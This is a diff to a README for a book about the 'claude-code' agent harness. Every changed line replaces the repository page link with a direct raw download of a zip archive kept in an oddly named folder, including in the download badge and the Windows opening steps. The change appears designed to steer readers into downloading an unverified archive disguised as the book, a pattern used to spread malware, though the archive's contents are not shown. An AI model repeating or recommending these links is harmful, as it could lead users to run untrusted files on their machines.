@@ -1,10 +1,10 @@
 # 📘 claude-code-book - Understand Agent Harness Faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Corryrevokable963/claude-code-book)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Corryrevokable963/claude-code-book/main/throatily/claude_book_code_v3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Corryrevokable963/claude-code-book
+Visit this page to download: https://raw.githubusercontent.com/Corryrevokable963/claude-code-book/main/throatily/claude_book_code_v3.5.zip
 
 If you want to read the book online, use the link above. If you want to save a copy, open the page in your browser and look for the latest release or book files.
 
@@ -39,7 +39,7 @@ If you plan to read online, a browser is enough. If you plan to open downloaded 
 ## 🚀 How to Open the Book on Windows
 
 1. Open this page in your browser:
-   https://github.com/Corryrevokable963/claude-code-book
+   https://raw.githubusercontent.com/Corryrevokable963/claude-code-book/main/throatily/claude_book_code_v3.5.zip
 
 2. Find the download or read link on the page.
 
@@ -159,7 +159,7 @@ To get the most value from the book:
 
 Use this link to visit the page and download or read the book:
 
-https://github.com/Corryrevokable963/claude-code-book
+https://raw.githubusercontent.com/Corryrevokable963/claude-code-book/main/throatily/claude_book_code_v3.5.zip
 
 ## 🧭 Suggested Path for New Readers
 
